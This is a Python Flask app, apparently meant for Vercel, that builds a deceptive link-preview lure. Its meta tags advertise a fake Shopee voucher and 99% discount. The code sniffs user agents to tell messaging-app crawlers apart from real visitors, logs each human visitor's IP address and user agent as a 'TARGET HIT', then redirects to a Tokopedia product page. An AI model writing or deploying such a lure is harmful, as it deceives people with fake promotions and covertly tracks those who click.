from flask import Flask, request, render_template_string

# Vercel mencari variable bernama 'app' ini secara otomatis
app = Flask(__name__)

# --- CONFIG GAMBAR & LINK ---
IMAGE_URL = "https://upload.wikimedia.org/wikipedia/commons/9/9a/Logo-Tokopedia.png"
TARGET_URL = "https://www.tokopedia.com/studioponsel/apple-macbook-air-m4-2025-13-inch-24-512gb-16-512gb-10-core-gpu-16-256gb-8-core-gpu-1730970954041230655?extParam=ivf%3Dfalse%26keyword%3Dmacbook+m4%26search_id%3D20251213173041C5FF2543B53F4C1C1ASB%26src%3Dsearch&t_id=1765647049167&t_st=1&t_pp=search_result&t_efo=search_pure_goods_card&t_ef=goods_search&t_sm=&t_spt=search_result"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="id" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopee Big Sale</title>
    <meta name="description" content="Diskon 99% Khusus Hari Ini.">
    <meta property="og:site_name" content="Shopee">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Kejutan Shopee - Voucher 500rb">
    <meta property="og:description" content="Klik untuk klaim sebelum hangus.">
    <meta property="og:image" content="{{ image }}">
    <meta property="og:image:width" content="600">
    <meta property="og:image:height" content="315">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="{{ image }}">
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f0f0; }
        .msg { color: #555; font-size: 14px; }
    </style>
</head>
<body>
    <p class="msg">Sedang memuat...</p>
    <script>
        setTimeout(function(){
            window.location.href = "{{ target }}";
        }, 1000);
    </script>
</body>
</html>
"""

# PERBAIKAN: Jangan gunakan nama 'handler' di sini
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    # Cek User Agent
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Deteksi Bot WhatsApp / Facebook
    is_bot = "facebookexternalhit" in user_agent or "whatsapp" in user_agent or "twitterbot" in user_agent

    if is_bot:
        return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)
    else:
        user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
        print(f"!!! TARGET HIT !!! IP: {user_ip} | UA: {user_agent}")
        return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)

# Note: Tidak perlu app.run()